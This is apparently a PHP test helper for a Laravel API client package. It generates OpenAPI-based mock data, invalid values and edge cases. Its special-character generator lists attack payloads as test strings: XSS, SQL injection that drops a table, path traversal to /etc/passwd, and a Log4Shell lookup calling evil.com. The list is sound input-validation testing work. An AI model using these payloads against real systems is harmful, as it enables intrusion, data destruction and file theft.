<?php

namespace MTechStack\LaravelApiModelClient\Tests\Utilities;

use Faker\Factory as Faker;
use Illuminate\Support\Str;

/**
 * Generates mock data based on OpenAPI schemas
 */
class MockDataGenerator
{
    protected $faker;
    protected array $generatedRefs = [];

    public function __construct()
    {
        $this->faker = Faker::create();
    }

    /**
     * Generate mock data from OpenAPI schema
     */
    public function generate(array $schema, int $count = 1): array
    {
        if ($count === 1) {
            return $this->generateSingle($schema);
        }

        $results = [];
        for ($i = 0; $i < $count; $i++) {
            $results[] = $this->generateSingle($schema);
        }

        return $results;
    }

    /**
     * Generate single mock data item
     */
    protected function generateSingle(array $schema): array
    {
        if (isset($schema['$ref'])) {
            return $this->resolveReference($schema['$ref']);
        }

        $type = $schema['type'] ?? 'object';

        switch ($type) {
            case 'object':
                return $this->generateObject($schema);
            case 'array':
                return $this->generateArray($schema);
            case 'string':
                return $this->generateString($schema);
            case 'integer':
                return $this->generateInteger($schema);
            case 'number':
                return $this->generateNumber($schema);
            case 'boolean':
                return $this->generateBoolean($schema);
            default:
                return null;
        }
    }

    /**
     * Generate object data
     */
    protected function generateObject(array $schema): array
    {
        $object = [];
        $properties = $schema['properties'] ?? [];
        $required = $schema['required'] ?? [];

        foreach ($properties as $propertyName => $propertySchema) {
            // Always generate required properties, optionally generate others
            if (in_array($propertyName, $required) || $this->faker->boolean(70)) {
                $object[$propertyName] = $this->generateSingle($propertySchema);
            }
        }

        return $object;
    }

    /**
     * Generate array data
     */
    protected function generateArray(array $schema): array
    {
        $items = $schema['items'] ?? ['type' => 'string'];
        $minItems = $schema['minItems'] ?? 1;
        $maxItems = $schema['maxItems'] ?? 5;
        
        $count = $this->faker->numberBetween($minItems, $maxItems);
        $array = [];

        for ($i = 0; $i < $count; $i++) {
            $array[] = $this->generateSingle($items);
        }

        return $array;
    }

    /**
     * Generate string data
     */
    protected function generateString(array $schema): string
    {
        $format = $schema['format'] ?? null;
        $enum = $schema['enum'] ?? null;
        $minLength = $schema['minLength'] ?? 1;
        $maxLength = $schema['maxLength'] ?? 255;

        // Handle enum values
        if ($enum) {
            return $this->faker->randomElement($enum);
        }

        // Handle specific formats
        switch ($format) {
            case 'email':
                return $this->faker->email;
            case 'uri':
            case 'url':
                return $this->faker->url;
            case 'uuid':
                return $this->faker->uuid;
            case 'date':
                return $this->faker->date();
            case 'date-time':
                return $this->faker->dateTime()->format('c');
            case 'time':
                return $this->faker->time();
            case 'password':
                return $this->faker->password(8, 20);
            case 'byte':
                return base64_encode($this->faker->text(20));
            case 'binary':
                return $this->faker->text(50);
            default:
                return $this->faker->text($this->faker->numberBetween($minLength, min($maxLength, 100)));
        }
    }

    /**
     * Generate integer data
     */
    protected function generateInteger(array $schema): int
    {
        $minimum = $schema['minimum'] ?? 1;
        $maximum = $schema['maximum'] ?? 1000;
        $format = $schema['format'] ?? null;

        switch ($format) {
            case 'int32':
                $maximum = min($maximum, 2147483647);
                break;
            case 'int64':
                $maximum = min($maximum, PHP_INT_MAX);
                break;
        }

        return $this->faker->numberBetween($minimum, $maximum);
    }

    /**
     * Generate number data
     */
    protected function generateNumber(array $schema): float
    {
        $minimum = $schema['minimum'] ?? 0.0;
        $maximum = $schema['maximum'] ?? 1000.0;
        $format = $schema['format'] ?? null;

        $value = $this->faker->randomFloat(2, $minimum, $maximum);

        if ($format === 'float') {
            return (float) $value;
        }

        return $value;
    }

    /**
     * Generate boolean data
     */
    protected function generateBoolean(array $schema): bool
    {
        return $this->faker->boolean();
    }

    /**
     * Resolve schema reference (simplified)
     */
    protected function resolveReference(string $ref): array
    {
        // For testing purposes, we'll generate some common reference types
        if (isset($this->generatedRefs[$ref])) {
            return $this->generatedRefs[$ref];
        }

        // Extract the schema name from the reference
        $schemaName = basename($ref);

        $mockData = match ($schemaName) {
            'Pet' => [
                'id' => $this->faker->numberBetween(1, 1000),
                'name' => $this->faker->firstName,
                'status' => $this->faker->randomElement(['available', 'pending', 'sold']),
                'category' => [
                    'id' => $this->faker->numberBetween(1, 10),
                    'name' => $this->faker->randomElement(['Dogs', 'Cats', 'Birds', 'Fish'])
                ],
                'tags' => [
                    [
                        'id' => $this->faker->numberBetween(1, 100),
                        'name' => $this->faker->randomElement(['friendly', 'playful', 'calm', 'energetic'])
                    ]
                ]
            ],
            'Category' => [
                'id' => $this->faker->numberBetween(1, 10),
                'name' => $this->faker->randomElement(['Dogs', 'Cats', 'Birds', 'Fish'])
            ],
            'Tag' => [
                'id' => $this->faker->numberBetween(1, 100),
                'name' => $this->faker->randomElement(['friendly', 'playful', 'calm', 'energetic'])
            ],
            'Product' => [
                'id' => $this->faker->numberBetween(1, 1000),
                'name' => $this->faker->words(3, true),
                'description' => $this->faker->sentence(),
                'price' => $this->faker->randomFloat(2, 10, 1000),
                'in_stock' => $this->faker->boolean(80),
                'stock_quantity' => $this->faker->numberBetween(0, 100),
                'created_at' => $this->faker->dateTime()->format('c'),
                'updated_at' => $this->faker->dateTime()->format('c')
            ],
            'User' => [
                'id' => $this->faker->uuid,
                'email' => $this->faker->email,
                'name' => $this->faker->name,
                'status' => $this->faker->randomElement(['active', 'inactive']),
                'created_at' => $this->faker->dateTime()->format('c'),
                'updated_at' => $this->faker->dateTime()->format('c')
            ],
            'Order' => [
                'id' => $this->faker->numberBetween(1, 10000),
                'customer_id' => $this->faker->numberBetween(1, 1000),
                'status' => $this->faker->randomElement(['pending', 'processing', 'shipped', 'delivered', 'cancelled']),
                'total' => $this->faker->randomFloat(2, 20, 500),
                'created_at' => $this->faker->dateTime()->format('c')
            ],
            'Error' => [
                'code' => $this->faker->numberBetween(400, 500),
                'message' => $this->faker->sentence()
            ],
            default => [
                'id' => $this->faker->numberBetween(1, 1000),
                'name' => $this->faker->word
            ]
        };

        $this->generatedRefs[$ref] = $mockData;
        return $mockData;
    }

    /**
     * Generate mock data for API response
     */
    public function generateApiResponse(array $schema, bool $includeMetadata = true): array
    {
        $data = $this->generate($schema);

        if (!$includeMetadata) {
            return $data;
        }

        return [
            'data' => $data,
            'meta' => [
                'current_page' => 1,
                'per_page' => 10,
                'total' => is_array($data) ? count($data) : 1,
                'last_page' => 1
            ],
            'links' => [
                'first' => 'http://localhost/api/v1/resource?page=1',
                'last' => 'http://localhost/api/v1/resource?page=1',
                'prev' => null,
                'next' => null
            ]
        ];
    }

    /**
     * Generate invalid data for testing validation
     */
    public function generateInvalidData(array $schema): array
    {
        $validData = $this->generateSingle($schema);
        $invalidData = $validData;

        // Introduce various types of invalid data
        foreach ($validData as $key => $value) {
            $rand = $this->faker->numberBetween(1, 5);
            
            switch ($rand) {
                case 1:
                    // Wrong type
                    if (is_string($value)) {
                        $invalidData[$key] = 123;
                    } elseif (is_int($value)) {
                        $invalidData[$key] = 'invalid_number';
                    } elseif (is_bool($value)) {
                        $invalidData[$key] = 'invalid_boolean';
                    }
                    break;
                    
                case 2:
                    // Null value
                    $invalidData[$key] = null;
                    break;
                    
                case 3:
                    // Empty value
                    if (is_string($value)) {
                        $invalidData[$key] = '';
                    } elseif (is_array($value)) {
                        $invalidData[$key] = [];
                    }
                    break;
                    
                case 4:
                    // Out of range
                    if (is_int($value)) {
                        $invalidData[$key] = -999999;
                    } elseif (is_string($value)) {
                        $invalidData[$key] = str_repeat('x', 1000);
                    }
                    break;
                    
                case 5:
                    // Remove required field
                    unset($invalidData[$key]);
                    break;
            }
            
            // Only introduce one invalid field per test case
            break;
        }

        return $invalidData;
    }

    /**
     * Generate edge case data
     */
    public function generateEdgeCaseData(array $schema): array
    {
        return [
            'empty_object' => [],
            'null_values' => array_fill_keys(array_keys($schema['properties'] ?? []), null),
            'empty_strings' => array_fill_keys(array_keys($schema['properties'] ?? []), ''),
            'max_values' => $this->generateMaxValues($schema),
            'min_values' => $this->generateMinValues($schema),
            'unicode_data' => $this->generateUnicodeData($schema),
            'special_characters' => $this->generateSpecialCharacterData($schema)
        ];
    }

    /**
     * Generate maximum boundary values
     */
    protected function generateMaxValues(array $schema): array
    {
        $data = [];
        $properties = $schema['properties'] ?? [];

        foreach ($properties as $key => $property) {
            $type = $property['type'] ?? 'string';
            
            switch ($type) {
                case 'string':
                    $maxLength = $property['maxLength'] ?? 255;
                    $data[$key] = str_repeat('x', $maxLength);
                    break;
                case 'integer':
                    $data[$key] = $property['maximum'] ?? PHP_INT_MAX;
                    break;
                case 'number':
                    $data[$key] = $property['maximum'] ?? PHP_FLOAT_MAX;
                    break;
                case 'array':
                    $maxItems = $property['maxItems'] ?? 100;
                    $data[$key] = array_fill(0, $maxItems, 'item');
                    break;
                default:
                    $data[$key] = $this->generateSingle($property);
            }
        }

        return $data;
    }

    /**
     * Generate minimum boundary values
     */
    protected function generateMinValues(array $schema): array
    {
        $data = [];
        $properties = $schema['properties'] ?? [];

        foreach ($properties as $key => $property) {
            $type = $property['type'] ?? 'string';
            
            switch ($type) {
                case 'string':
                    $minLength = $property['minLength'] ?? 0;
                    $data[$key] = str_repeat('x', $minLength);
                    break;
                case 'integer':
                    $data[$key] = $property['minimum'] ?? 0;
                    break;
                case 'number':
                    $data[$key] = $property['minimum'] ?? 0.0;
                    break;
                case 'array':
                    $minItems = $property['minItems'] ?? 0;
                    $data[$key] = array_fill(0, $minItems, 'item');
                    break;
                default:
                    $data[$key] = $this->generateSingle($property);
            }
        }

        return $data;
    }

    /**
     * Generate Unicode test data
     */
    protected function generateUnicodeData(array $schema): array
    {
        $data = [];
        $properties = $schema['properties'] ?? [];
        
        $unicodeStrings = [
            '🚀 Unicode test with emojis 🎉',
            'Тест на кириллице',
            '测试中文字符',
            'العربية اختبار',
            'ñáéíóú àèìòù âêîôû'
        ];

        foreach ($properties as $key => $property) {
            if (($property['type'] ?? '') === 'string') {
                $data[$key] = $this->faker->randomElement($unicodeStrings);
            } else {
                $data[$key] = $this->generateSingle($property);
            }
        }

        return $data;
    }

    /**
     * Generate special character test data
     */
    protected function generateSpecialCharacterData(array $schema): array
    {
        $data = [];
        $properties = $schema['properties'] ?? [];
        
        $specialStrings = [
            '<script>alert("xss")</script>',
            'SELECT * FROM users; DROP TABLE users;',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '\'; DROP TABLE users; --'
        ];

        foreach ($properties as $key => $property) {
            if (($property['type'] ?? '') === 'string') {
                $data[$key] = $this->faker->randomElement($specialStrings);
            } else {
                $data[$key] = $this->generateSingle($property);
            }
        }

        return $data;
    }

    /**
     * Reset generated references cache
     */
    public function resetCache(): void
    {
        $this->generatedRefs = [];
    }
}
